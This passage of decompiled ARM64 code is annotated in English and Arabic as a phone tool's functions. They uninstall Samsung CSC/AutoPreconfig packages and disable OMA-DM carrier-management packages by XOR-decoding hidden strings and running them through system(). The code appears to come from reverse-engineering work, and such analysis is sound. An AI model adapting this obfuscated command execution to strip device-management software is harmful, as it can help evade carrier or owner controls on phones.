                                                  uVar38 >> 8) ^ bVar20,(byte)uVar38 ^ bVar19)))))))
    ;
    *(byte *)((long)puVar14 + 0x32) = *(byte *)((long)puVar14 + 0x32) ^ 0x2b;
  }
  pcVar16 = (char *)FUN_002295c4(&DAT_002358b0);
  system(pcVar16);
  pbVar12 = (byte *)FUN_002295c4(&DAT_00235910);
  if ((*pbVar12 & 1) == 0) {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_002358f0);
    uVar17 = _DAT_001772f0;
    puVar14[1] = _UNK_001772f8;
    *puVar14 = uVar17;
    *(undefined4 *)(puVar14 + 2) = 0x1e56796;
    FUN_002234c0(&LAB_001b3710,puVar14,0x2362d0);
    puVar18 = (undefined1 *)FUN_002295c4(&DAT_00235910);
    *puVar18 = 1;
  }
  pcVar16 = (char *)FUN_002295c4(&DAT_002358f0);
  FUN_001b5f9c();
  unlink(pcVar16);
  local_1a8 = &PTR_FUN_0022b888;
  local_f8[0] = &PTR_FUN_0022b8b0;
  FUN_0019918c(local_1a0);
  FUN_001cb780(&local_1a8,&PTR_PTR_0022b8c8);
  thunk_FUN_001c36f0(local_f8);
  if ((local_1c0[0] & 1) != 0) {
    free(local_1b0);
  }
LAB_001a6180:
  if (*(long *)(lVar2 + 0x28) != local_48) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a4504
 * Purpose (EN): CSC Package Uninstaller & Cleaner
 * Purpose (AR): إلغاء تثبيت com.sec.android.AutoPreconfig وتنظيف الكاش
 */

// Function: FUN_001a4504 @ 001a4504
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_001a4504(void)

{
  char cVar1;
  int iVar2;
  byte *pbVar3;
  long lVar4;
  undefined8 *puVar5;
  char *pcVar6;
  undefined8 uVar7;
  undefined1 *puVar8;
  byte bVar9;
  byte bVar10;
  byte bVar11;
  byte bVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  undefined8 uVar25;
  undefined8 uVar26;
  undefined8 uVar27;
  undefined8 uVar28;
  undefined8 uVar29;
  
  pbVar3 = (byte *)FUN_002295c4(&DAT_002346d0);
  if ((*pbVar3 & 1) == 0) {
    uVar7 = FUN_002295c4(&DAT_002346b0);
    FUN_001aafc4(uVar7,&DAT_00178c34);
    FUN_002234c0(&LAB_001ab160,uVar7,0x2362d0);
    puVar8 = (undefined1 *)FUN_002295c4(&DAT_002346d0);
    *puVar8 = 1;
    lVar4 = FUN_002295c4(&DAT_002346b0);
    cVar1 = *(char *)(lVar4 + 0x32);
  }
  else {
    lVar4 = FUN_002295c4(&DAT_002346b0);
    cVar1 = *(char *)(lVar4 + 0x32);
  }
  if (cVar1 != '\0') {
    puVar5 = (undefined8 *)FUN_002295c4(&DAT_002346b0);
    uVar29 = puVar5[5];
    uVar28 = puVar5[4];
    uVar26 = puVar5[1];
    uVar7 = *puVar5;
    uVar27 = puVar5[3];
    uVar25 = puVar5[2];
    *(undefined1 *)((long)puVar5 + 0x32) = 0;
    bVar9 = (byte)_DAT_00177890;
    bVar10 = (byte)((ulong)_DAT_00177890 >> 8);
    bVar11 = (byte)((ulong)_DAT_00177890 >> 0x10);
    bVar12 = (byte)((ulong)_DAT_00177890 >> 0x18);
    bVar13 = (byte)((ulong)_DAT_00177890 >> 0x20);
    bVar14 = (byte)((ulong)_DAT_00177890 >> 0x28);
    bVar15 = (byte)((ulong)_DAT_00177890 >> 0x30);
    bVar16 = (byte)((ulong)_DAT_00177890 >> 0x38);
    bVar17 = (byte)_UNK_00177898;
    bVar18 = (byte)((ulong)_UNK_00177898 >> 8);
    bVar19 = (byte)((ulong)_UNK_00177898 >> 0x10);
    bVar20 = (byte)((ulong)_UNK_00177898 >> 0x18);
    bVar21 = (byte)((ulong)_UNK_00177898 >> 0x20);
    bVar22 = (byte)((ulong)_UNK_00177898 >> 0x28);
    bVar23 = (byte)((ulong)_UNK_00177898 >> 0x30);
    bVar24 = (byte)((ulong)_UNK_00177898 >> 0x38);
    *(byte *)((long)puVar5 + 0x31) = *(byte *)((long)puVar5 + 0x31) ^ 0xd1;
    *(byte *)(puVar5 + 6) = *(byte *)(puVar5 + 6) ^ 199;
    puVar5[1] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar24,
                         CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar23,
                                  CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar22,
                                           CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar21,
                                                    CONCAT13((byte)((ulong)uVar26 >> 0x18) ^ bVar20,
                                                             CONCAT12((byte)((ulong)uVar26 >> 0x10)
                                                                      ^ bVar19,CONCAT11((byte)((
                                                  ulong)uVar26 >> 8) ^ bVar18,(byte)uVar26 ^ bVar17)
                                                  ))))));
    *puVar5 = CONCAT17((byte)((ulong)uVar7 >> 0x38) ^ bVar16,
                       CONCAT16((byte)((ulong)uVar7 >> 0x30) ^ bVar15,
                                CONCAT15((byte)((ulong)uVar7 >> 0x28) ^ bVar14,
                                         CONCAT14((byte)((ulong)uVar7 >> 0x20) ^ bVar13,
                                                  CONCAT13((byte)((ulong)uVar7 >> 0x18) ^ bVar12,
                                                           CONCAT12((byte)((ulong)uVar7 >> 0x10) ^
                                                                    bVar11,CONCAT11((byte)((ulong)
                                                  uVar7 >> 8) ^ bVar10,(byte)uVar7 ^ bVar9)))))));
    puVar5[3] = CONCAT17((byte)((ulong)uVar27 >> 0x38) ^ bVar24,
                         CONCAT16((byte)((ulong)uVar27 >> 0x30) ^ bVar23,
                                  CONCAT15((byte)((ulong)uVar27 >> 0x28) ^ bVar22,
                                           CONCAT14((byte)((ulong)uVar27 >> 0x20) ^ bVar21,
                                                    CONCAT13((byte)((ulong)uVar27 >> 0x18) ^ bVar20,
                                                             CONCAT12((byte)((ulong)uVar27 >> 0x10)
                                                                      ^ bVar19,CONCAT11((byte)((
                                                  ulong)uVar27 >> 8) ^ bVar18,(byte)uVar27 ^ bVar17)
                                                  ))))));
    puVar5[2] = CONCAT17((byte)((ulong)uVar25 >> 0x38) ^ bVar16,
                         CONCAT16((byte)((ulong)uVar25 >> 0x30) ^ bVar15,
                                  CONCAT15((byte)((ulong)uVar25 >> 0x28) ^ bVar14,
                                           CONCAT14((byte)((ulong)uVar25 >> 0x20) ^ bVar13,
                                                    CONCAT13((byte)((ulong)uVar25 >> 0x18) ^ bVar12,
                                                             CONCAT12((byte)((ulong)uVar25 >> 0x10)
                                                                      ^ bVar11,CONCAT11((byte)((
                                                  ulong)uVar25 >> 8) ^ bVar10,(byte)uVar25 ^ bVar9))
                                                  )))));
    puVar5[5] = CONCAT17((byte)((ulong)uVar29 >> 0x38) ^ bVar24,
                         CONCAT16((byte)((ulong)uVar29 >> 0x30) ^ bVar23,
                                  CONCAT15((byte)((ulong)uVar29 >> 0x28) ^ bVar22,
                                           CONCAT14((byte)((ulong)uVar29 >> 0x20) ^ bVar21,
                                                    CONCAT13((byte)((ulong)uVar29 >> 0x18) ^ bVar20,
                                                             CONCAT12((byte)((ulong)uVar29 >> 0x10)
                                                                      ^ bVar19,CONCAT11((byte)((
                                                  ulong)uVar29 >> 8) ^ bVar18,(byte)uVar29 ^ bVar17)
                                                  ))))));
    puVar5[4] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar16,
                         CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar15,
                                  CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar14,
                                           CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar13,
                                                    CONCAT13((byte)((ulong)uVar28 >> 0x18) ^ bVar12,
                                                             CONCAT12((byte)((ulong)uVar28 >> 0x10)
                                                                      ^ bVar11,CONCAT11((byte)((
                                                  ulong)uVar28 >> 8) ^ bVar10,(byte)uVar28 ^ bVar9))
                                                  )))));
  }
  pcVar6 = (char *)FUN_002295c4(&DAT_002346b0);
  system(pcVar6);
  pbVar3 = (byte *)FUN_002295c4(&DAT_00234710);
  if ((*pbVar3 & 1) == 0) {
    uVar7 = FUN_002295c4(&DAT_002346f0);
    FUN_001ab174(uVar7,&DAT_00178c66);
    FUN_002234c0(&LAB_001ab2e8,uVar7,0x2362d0);
    puVar8 = (undefined1 *)FUN_002295c4(&DAT_00234710);
    *puVar8 = 1;
    lVar4 = FUN_002295c4(&DAT_002346f0);
    cVar1 = *(char *)(lVar4 + 0x2d);
  }
  else {
    lVar4 = FUN_002295c4(&DAT_002346f0);
    cVar1 = *(char *)(lVar4 + 0x2d);
  }
  if (cVar1 != '\0') {
    puVar5 = (undefined8 *)FUN_002295c4(&DAT_002346f0);
    uVar26 = _UNK_00176fd8;
    uVar7 = _DAT_00176fd0;
    *(byte *)((long)puVar5 + 0x21) = *(byte *)((long)puVar5 + 0x21) ^ 0xb;
    *(byte *)((long)puVar5 + 0x22) = *(byte *)((long)puVar5 + 0x22) ^ 0xdf;
    *(byte *)((long)puVar5 + 0x23) = *(byte *)((long)puVar5 + 0x23) ^ 0x77;
    *(byte *)(puVar5 + 4) = *(byte *)(puVar5 + 4) ^ 0xe3;
    uVar27 = puVar5[1];
    uVar25 = *puVar5;
    uVar29 = puVar5[3];
    uVar28 = puVar5[2];
    *(byte *)((long)puVar5 + 0x24) = *(byte *)((long)puVar5 + 0x24) ^ 0xd1;
    *(byte *)((long)puVar5 + 0x26) = *(byte *)((long)puVar5 + 0x26) ^ 0x47;
    *(undefined1 *)((long)puVar5 + 0x2d) = 0;
    *(byte *)((long)puVar5 + 0x25) = *(byte *)((long)puVar5 + 0x25) ^ 0x33;
    bVar9 = (byte)((ulong)uVar7 >> 8);
    bVar10 = (byte)((ulong)uVar7 >> 0x10);
    bVar11 = (byte)((ulong)uVar7 >> 0x18);
    bVar12 = (byte)((ulong)uVar7 >> 0x20);
    bVar13 = (byte)((ulong)uVar7 >> 0x28);
    bVar14 = (byte)((ulong)uVar7 >> 0x30);
    bVar15 = (byte)((ulong)uVar7 >> 0x38);
    bVar16 = (byte)((ulong)uVar26 >> 8);
    bVar17 = (byte)((ulong)uVar26 >> 0x10);
    bVar18 = (byte)((ulong)uVar26 >> 0x18);
    bVar19 = (byte)((ulong)uVar26 >> 0x20);
    bVar20 = (byte)((ulong)uVar26 >> 0x28);
    bVar21 = (byte)((ulong)uVar26 >> 0x30);
    bVar22 = (byte)((ulong)uVar26 >> 0x38);
    *(byte *)(puVar5 + 5) = *(byte *)(puVar5 + 5) ^ 0xe3;
    *(byte *)((long)puVar5 + 0x27) = *(byte *)((long)puVar5 + 0x27) ^ 0xb9;
    *(byte *)((long)puVar5 + 0x29) = *(byte *)((long)puVar5 + 0x29) ^ 0xb;
    puVar5[1] = CONCAT17((byte)((ulong)uVar27 >> 0x38) ^ bVar22,
                         CONCAT16((byte)((ulong)uVar27 >> 0x30) ^ bVar21,
                                  CONCAT15((byte)((ulong)uVar27 >> 0x28) ^ bVar20,
                                           CONCAT14((byte)((ulong)uVar27 >> 0x20) ^ bVar19,
                                                    CONCAT13((byte)((ulong)uVar27 >> 0x18) ^ bVar18,
                                                             CONCAT12((byte)((ulong)uVar27 >> 0x10)
                                                                      ^ bVar17,CONCAT11((byte)((
                                                  ulong)uVar27 >> 8) ^ bVar16,
                                                  (byte)uVar27 ^ (byte)uVar26)))))));
    *puVar5 = CONCAT17((byte)((ulong)uVar25 >> 0x38) ^ bVar15,
                       CONCAT16((byte)((ulong)uVar25 >> 0x30) ^ bVar14,
                                CONCAT15((byte)((ulong)uVar25 >> 0x28) ^ bVar13,
                                         CONCAT14((byte)((ulong)uVar25 >> 0x20) ^ bVar12,
                                                  CONCAT13((byte)((ulong)uVar25 >> 0x18) ^ bVar11,
                                                           CONCAT12((byte)((ulong)uVar25 >> 0x10) ^
                                                                    bVar10,CONCAT11((byte)((ulong)
                                                  uVar25 >> 8) ^ bVar9,(byte)uVar25 ^ (byte)uVar7)))
                                                 ))));
    puVar5[3] = CONCAT17((byte)((ulong)uVar29 >> 0x38) ^ bVar22,
                         CONCAT16((byte)((ulong)uVar29 >> 0x30) ^ bVar21,
                                  CONCAT15((byte)((ulong)uVar29 >> 0x28) ^ bVar20,
                                           CONCAT14((byte)((ulong)uVar29 >> 0x20) ^ bVar19,
                                                    CONCAT13((byte)((ulong)uVar29 >> 0x18) ^ bVar18,
                                                             CONCAT12((byte)((ulong)uVar29 >> 0x10)
                                                                      ^ bVar17,CONCAT11((byte)((
                                                  ulong)uVar29 >> 8) ^ bVar16,
                                                  (byte)uVar29 ^ (byte)uVar26)))))));
    puVar5[2] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar15,
                         CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar14,
                                  CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar13,
                                           CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar12,
                                                    CONCAT13((byte)((ulong)uVar28 >> 0x18) ^ bVar11,
                                                             CONCAT12((byte)((ulong)uVar28 >> 0x10)
                                                                      ^ bVar10,CONCAT11((byte)((
                                                  ulong)uVar28 >> 8) ^ bVar9,
                                                  (byte)uVar28 ^ (byte)uVar7)))))));
    *(byte *)((long)puVar5 + 0x2a) = *(byte *)((long)puVar5 + 0x2a) ^ 0xdf;
    *(byte *)((long)puVar5 + 0x2b) = *(byte *)((long)puVar5 + 0x2b) ^ 0x77;
    *(byte *)((long)puVar5 + 0x2c) = *(byte *)((long)puVar5 + 0x2c) ^ 0xd1;
  }
  pcVar6 = (char *)FUN_002295c4(&DAT_002346f0);
  system(pcVar6);
  pbVar3 = (byte *)FUN_002295c4(&DAT_00234750);
  if ((*pbVar3 & 1) == 0) {
    uVar7 = FUN_002295c4(&DAT_00234730);
    FUN_001ab2f8(uVar7,&DAT_00178c93);
    FUN_002234c0(&LAB_001ab48c,uVar7,0x2362d0);
    puVar8 = (undefined1 *)FUN_002295c4(&DAT_00234750);
    *puVar8 = 1;
    lVar4 = FUN_002295c4(&DAT_00234730);
    cVar1 = *(char *)(lVar4 + 0x31);
  }
  else {
    lVar4 = FUN_002295c4(&DAT_00234730);
    cVar1 = *(char *)(lVar4 + 0x31);
  }
  if (cVar1 != '\0') {
    puVar5 = (undefined8 *)FUN_002295c4(&DAT_00234730);
    uVar29 = puVar5[5];
    uVar28 = puVar5[4];
    uVar26 = puVar5[1];
    uVar7 = *puVar5;
    uVar27 = puVar5[3];
    uVar25 = puVar5[2];
    *(undefined1 *)((long)puVar5 + 0x31) = 0;
    bVar9 = (byte)_DAT_001776c0;
    bVar10 = (byte)((ulong)_DAT_001776c0 >> 8);
    bVar11 = (byte)((ulong)_DAT_001776c0 >> 0x10);
    bVar12 = (byte)((ulong)_DAT_001776c0 >> 0x18);
    bVar13 = (byte)((ulong)_DAT_001776c0 >> 0x20);
    bVar14 = (byte)((ulong)_DAT_001776c0 >> 0x28);
    bVar15 = (byte)((ulong)_DAT_001776c0 >> 0x30);
    bVar16 = (byte)((ulong)_DAT_001776c0 >> 0x38);
    bVar17 = (byte)_UNK_001776c8;
    bVar18 = (byte)((ulong)_UNK_001776c8 >> 8);
    bVar19 = (byte)((ulong)_UNK_001776c8 >> 0x10);
    bVar20 = (byte)((ulong)_UNK_001776c8 >> 0x18);
    bVar21 = (byte)((ulong)_UNK_001776c8 >> 0x20);
    bVar22 = (byte)((ulong)_UNK_001776c8 >> 0x28);
    bVar23 = (byte)((ulong)_UNK_001776c8 >> 0x30);
    bVar24 = (byte)((ulong)_UNK_001776c8 >> 0x38);
    *(byte *)(puVar5 + 6) = *(byte *)(puVar5 + 6) ^ 0xed;
    puVar5[1] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar24,
                         CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar23,
                                  CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar22,
                                           CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar21,
                                                    CONCAT13((byte)((ulong)uVar26 >> 0x18) ^ bVar20,
                                                             CONCAT12((byte)((ulong)uVar26 >> 0x10)
                                                                      ^ bVar19,CONCAT11((byte)((
                                                  ulong)uVar26 >> 8) ^ bVar18,(byte)uVar26 ^ bVar17)
                                                  ))))));
    *puVar5 = CONCAT17((byte)((ulong)uVar7 >> 0x38) ^ bVar16,
                       CONCAT16((byte)((ulong)uVar7 >> 0x30) ^ bVar15,
                                CONCAT15((byte)((ulong)uVar7 >> 0x28) ^ bVar14,
                                         CONCAT14((byte)((ulong)uVar7 >> 0x20) ^ bVar13,
                                                  CONCAT13((byte)((ulong)uVar7 >> 0x18) ^ bVar12,
                                                           CONCAT12((byte)((ulong)uVar7 >> 0x10) ^
                                                                    bVar11,CONCAT11((byte)((ulong)
                                                  uVar7 >> 8) ^ bVar10,(byte)uVar7 ^ bVar9)))))));
    puVar5[3] = CONCAT17((byte)((ulong)uVar27 >> 0x38) ^ bVar24,
                         CONCAT16((byte)((ulong)uVar27 >> 0x30) ^ bVar23,
                                  CONCAT15((byte)((ulong)uVar27 >> 0x28) ^ bVar22,
                                           CONCAT14((byte)((ulong)uVar27 >> 0x20) ^ bVar21,
                                                    CONCAT13((byte)((ulong)uVar27 >> 0x18) ^ bVar20,
                                                             CONCAT12((byte)((ulong)uVar27 >> 0x10)
                                                                      ^ bVar19,CONCAT11((byte)((
                                                  ulong)uVar27 >> 8) ^ bVar18,(byte)uVar27 ^ bVar17)
                                                  ))))));
    puVar5[2] = CONCAT17((byte)((ulong)uVar25 >> 0x38) ^ bVar16,
                         CONCAT16((byte)((ulong)uVar25 >> 0x30) ^ bVar15,
                                  CONCAT15((byte)((ulong)uVar25 >> 0x28) ^ bVar14,
                                           CONCAT14((byte)((ulong)uVar25 >> 0x20) ^ bVar13,
                                                    CONCAT13((byte)((ulong)uVar25 >> 0x18) ^ bVar12,
                                                             CONCAT12((byte)((ulong)uVar25 >> 0x10)
                                                                      ^ bVar11,CONCAT11((byte)((
                                                  ulong)uVar25 >> 8) ^ bVar10,(byte)uVar25 ^ bVar9))
                                                  )))));
    puVar5[5] = CONCAT17((byte)((ulong)uVar29 >> 0x38) ^ bVar24,
                         CONCAT16((byte)((ulong)uVar29 >> 0x30) ^ bVar23,
                                  CONCAT15((byte)((ulong)uVar29 >> 0x28) ^ bVar22,
                                           CONCAT14((byte)((ulong)uVar29 >> 0x20) ^ bVar21,
                                                    CONCAT13((byte)((ulong)uVar29 >> 0x18) ^ bVar20,
                                                             CONCAT12((byte)((ulong)uVar29 >> 0x10)
                                                                      ^ bVar19,CONCAT11((byte)((
                                                  ulong)uVar29 >> 8) ^ bVar18,(byte)uVar29 ^ bVar17)
                                                  ))))));
    puVar5[4] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar16,
                         CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar15,
                                  CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar14,
                                           CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar13,
                                                    CONCAT13((byte)((ulong)uVar28 >> 0x18) ^ bVar12,
                                                             CONCAT12((byte)((ulong)uVar28 >> 0x10)
                                                                      ^ bVar11,CONCAT11((byte)((
                                                  ulong)uVar28 >> 8) ^ bVar10,(byte)uVar28 ^ bVar9))
                                                  )))));
  }
  pcVar6 = (char *)FUN_002295c4(&DAT_00234730);
  iVar2 = system(pcVar6);
  return iVar2;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a483c
 * Purpose (EN): AutoPreconfig & OMA-DM Disabler
 * Purpose (AR): إيقاف وتعطيل حزم مشغلي الشبكات omadmspr
 */

// Function: FUN_001a483c @ 001a483c
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001a483c(void)

{
  ulong uVar1;
  char cVar2;
  long lVar3;
  void *pvVar4;
  FILE *__stream;
  int iVar5;
  int iVar6;
  byte *pbVar7;
  long lVar8;
  undefined8 *puVar9;
  char *pcVar10;
  undefined8 uVar11;
  undefined1 *puVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  byte bVar26;
  byte bVar27;
  byte bVar28;
  undefined8 uVar29;
  undefined8 uVar30;
  undefined8 uVar31;
  undefined8 uVar32;
  undefined8 uVar33;
  byte local_1b0 [8];
  ulong local_1a8;
  void *local_1a0;
  undefined8 local_198;
  undefined **local_190;
  long local_188 [3];
  uint auStack_170 [24];
  FILE *local_110;
  undefined4 local_f0;
  undefined **local_e0 [17];
  undefined8 local_58;
  undefined4 local_50;
  long local_48;
  
  lVar3 = tpidr_el0;
  local_48 = *(long *)(lVar3 + 0x28);
  local_190 = (undefined **)0x2faf080;
  FUN_0020c368(&local_190);
  FUN_001c1d04(local_1b0,&DAT_002362f0,0);
  pbVar7 = (byte *)FUN_002295c4(&DAT_00234790);
  if ((*pbVar7 & 1) == 0) {
    puVar9 = (undefined8 *)FUN_002295c4(&DAT_00234770);
    uVar11 = _DAT_00177160;
    puVar9[1] = _UNK_00177168;
    *puVar9 = uVar11;
    *(undefined4 *)(puVar9 + 2) = 0x1456787;
    FUN_002234c0(&LAB_001ab4a0,puVar9,0x2362d0);
    puVar12 = (undefined1 *)FUN_002295c4(&DAT_00234790);
    *puVar12 = 1;
  }
  FUN_002295c4(&DAT_00234770);
  FUN_001b5ba4();
  local_190 = &PTR_FUN_0022b8f8;
  local_e0[0] = &PTR_FUN_0022b920;
  FUN_001d0b00(local_e0,local_188);
  local_58 = 0;
  local_50 = 0xffffffff;
  local_190 = &PTR_FUN_0022b888;
  local_e0[0] = &PTR_FUN_0022b8b0;
  FUN_00199f28(local_188);
  if (local_110 == (FILE *)0x0) {
    pcVar10 = (char *)FUN_002295c4(&DAT_00234770);
    local_110 = fopen(pcVar10,"we");
    if (local_110 == (FILE *)0x0) goto LAB_001a4900;
    local_f0 = 0x10;
  }
  else {
LAB_001a4900:
    FUN_001d09e0((undefined *)((long)local_188 + (long)(local_190[-3] + -8)),
                 *(uint *)((long)auStack_170 + (long)local_190[-3]) | 4);
  }
  uVar1 = (ulong)(local_1b0[0] >> 1);
  pvVar4 = (void *)((ulong)local_1b0 | 1);
  if ((local_1b0[0] & 1) != 0) {
    uVar1 = local_1a8;
    pvVar4 = local_1a0;
  }
  FUN_0019aae4(&local_190,pvVar4,uVar1);
  __stream = local_110;
  if (local_110 != (FILE *)0x0) {
    iVar5 = (**(code **)(local_188[0] + 0x30))(local_188);
    iVar6 = fclose(__stream);
    local_110 = (FILE *)0x0;
    (**(code **)(local_188[0] + 0x18))(local_188,0,0);
    if (iVar6 == 0 && iVar5 == 0) goto LAB_001a49d4;
  }
  FUN_001d09e0((undefined *)((long)local_188 + (long)(local_190[-3] + -8)),
               *(uint *)((long)auStack_170 + (long)local_190[-3]) | 4);
LAB_001a49d4:
  pbVar7 = (byte *)FUN_002295c4(&DAT_002347d0);
  if ((*pbVar7 & 1) == 0) {
    uVar11 = FUN_002295c4(&DAT_002347b0);
    FUN_001ab4ac(uVar11,&DAT_00178cc4);
    FUN_002234c0(&LAB_001ab6a8,uVar11,0x2362d0);
    puVar12 = (undefined1 *)FUN_002295c4(&DAT_002347d0);
    *puVar12 = 1;
    lVar8 = FUN_002295c4(&DAT_002347b0);
    cVar2 = *(char *)(lVar8 + 0x3e);
  }
  else {
    lVar8 = FUN_002295c4(&DAT_002347b0);
    cVar2 = *(char *)(lVar8 + 0x3e);
  }
  if (cVar2 != '\0') {
    puVar9 = (undefined8 *)FUN_002295c4(&DAT_002347b0);
    uVar31 = _UNK_00176bf8;
    uVar11 = _DAT_00176bf0;
    *(undefined1 *)((long)puVar9 + 0x3e) = 0;
    *(byte *)((long)puVar9 + 0x31) = *(byte *)((long)puVar9 + 0x31) ^ 0xfd;
    uVar30 = puVar9[1];
    uVar29 = *puVar9;
    uVar33 = puVar9[3];
    uVar32 = puVar9[2];
    *(byte *)(puVar9 + 6) = *(byte *)(puVar9 + 6) ^ 0x2b;
    *(byte *)((long)puVar9 + 0x34) = *(byte *)((long)puVar9 + 0x34) ^ 0xe3;
    *(byte *)((long)puVar9 + 0x32) = *(byte *)((long)puVar9 + 0x32) ^ 0xe9;
    *(byte *)((long)puVar9 + 0x33) = *(byte *)((long)puVar9 + 0x33) ^ 0x2f;
    *(byte *)(puVar9 + 7) = *(byte *)(puVar9 + 7) ^ 0x2b;
    bVar13 = (byte)uVar11;
    bVar14 = (byte)((ulong)uVar11 >> 8);
    bVar15 = (byte)((ulong)uVar11 >> 0x10);
    bVar16 = (byte)((ulong)uVar11 >> 0x18);
    bVar17 = (byte)((ulong)uVar11 >> 0x20);
    bVar18 = (byte)((ulong)uVar11 >> 0x28);
    bVar19 = (byte)((ulong)uVar11 >> 0x30);
    bVar20 = (byte)((ulong)uVar11 >> 0x38);
    bVar21 = (byte)uVar31;
    bVar22 = (byte)((ulong)uVar31 >> 8);
    bVar23 = (byte)((ulong)uVar31 >> 0x10);
    bVar24 = (byte)((ulong)uVar31 >> 0x18);
    bVar25 = (byte)((ulong)uVar31 >> 0x20);
    bVar26 = (byte)((ulong)uVar31 >> 0x28);
    bVar27 = (byte)((ulong)uVar31 >> 0x30);
    bVar28 = (byte)((ulong)uVar31 >> 0x38);
    *(byte *)((long)puVar9 + 0x35) = *(byte *)((long)puVar9 + 0x35) ^ 0x41;
    *(byte *)((long)puVar9 + 0x36) = *(byte *)((long)puVar9 + 0x36) ^ 0x85;
    *(byte *)((long)puVar9 + 0x37) = *(byte *)((long)puVar9 + 0x37) ^ 0x6f;
    puVar9[1] = CONCAT17((byte)((ulong)uVar30 >> 0x38) ^ bVar28,
                         CONCAT16((byte)((ulong)uVar30 >> 0x30) ^ bVar27,
                                  CONCAT15((byte)((ulong)uVar30 >> 0x28) ^ bVar26,
                                           CONCAT14((byte)((ulong)uVar30 >> 0x20) ^ bVar25,
                                                    CONCAT13((byte)((ulong)uVar30 >> 0x18) ^ bVar24,
                                                             CONCAT12((byte)((ulong)uVar30 >> 0x10)
                                                                      ^ bVar23,CONCAT11((byte)((
                                                  ulong)uVar30 >> 8) ^ bVar22,(byte)uVar30 ^ bVar21)
                                                  ))))));
    *puVar9 = CONCAT17((byte)((ulong)uVar29 >> 0x38) ^ bVar20,
                       CONCAT16((byte)((ulong)uVar29 >> 0x30) ^ bVar19,
                                CONCAT15((byte)((ulong)uVar29 >> 0x28) ^ bVar18,
                                         CONCAT14((byte)((ulong)uVar29 >> 0x20) ^ bVar17,
                                                  CONCAT13((byte)((ulong)uVar29 >> 0x18) ^ bVar16,
                                                           CONCAT12((byte)((ulong)uVar29 >> 0x10) ^
                                                                    bVar15,CONCAT11((byte)((ulong)
                                                  uVar29 >> 8) ^ bVar14,(byte)uVar29 ^ bVar13)))))))
    ;
    puVar9[3] = CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar28,
                         CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar27,
                                  CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar26,
                                           CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar25,
                                                    CONCAT13((byte)((ulong)uVar33 >> 0x18) ^ bVar24,
                                                             CONCAT12((byte)((ulong)uVar33 >> 0x10)
                                                                      ^ bVar23,CONCAT11((byte)((
                                                  ulong)uVar33 >> 8) ^ bVar22,(byte)uVar33 ^ bVar21)
                                                  ))))));
    puVar9[2] = CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar20,
                         CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar19,
                                  CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar18,
                                           CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar17,
                                                    CONCAT13((byte)((ulong)uVar32 >> 0x18) ^ bVar16,
                                                             CONCAT12((byte)((ulong)uVar32 >> 0x10)
                                                                      ^ bVar15,CONCAT11((byte)((
                                                  ulong)uVar32 >> 8) ^ bVar14,(byte)uVar32 ^ bVar13)
                                                  ))))));
    uVar31 = puVar9[5];
    uVar11 = puVar9[4];
    *(byte *)((long)puVar9 + 0x3b) = *(byte *)((long)puVar9 + 0x3b) ^ 0x2f;
    *(byte *)((long)puVar9 + 0x39) = *(byte *)((long)puVar9 + 0x39) ^ 0xfd;
    *(byte *)((long)puVar9 + 0x3a) = *(byte *)((long)puVar9 + 0x3a) ^ 0xe9;
    puVar9[5] = CONCAT17((byte)((ulong)uVar31 >> 0x38) ^ bVar28,
                         CONCAT16((byte)((ulong)uVar31 >> 0x30) ^ bVar27,
                                  CONCAT15((byte)((ulong)uVar31 >> 0x28) ^ bVar26,
                                           CONCAT14((byte)((ulong)uVar31 >> 0x20) ^ bVar25,
                                                    CONCAT13((byte)((ulong)uVar31 >> 0x18) ^ bVar24,
                                                             CONCAT12((byte)((ulong)uVar31 >> 0x10)
                                                                      ^ bVar23,CONCAT11((byte)((
                                                  ulong)uVar31 >> 8) ^ bVar22,(byte)uVar31 ^ bVar21)
                                                  ))))));
    puVar9[4] = CONCAT17((byte)((ulong)uVar11 >> 0x38) ^ bVar20,
                         CONCAT16((byte)((ulong)uVar11 >> 0x30) ^ bVar19,
                                  CONCAT15((byte)((ulong)uVar11 >> 0x28) ^ bVar18,
                                           CONCAT14((byte)((ulong)uVar11 >> 0x20) ^ bVar17,
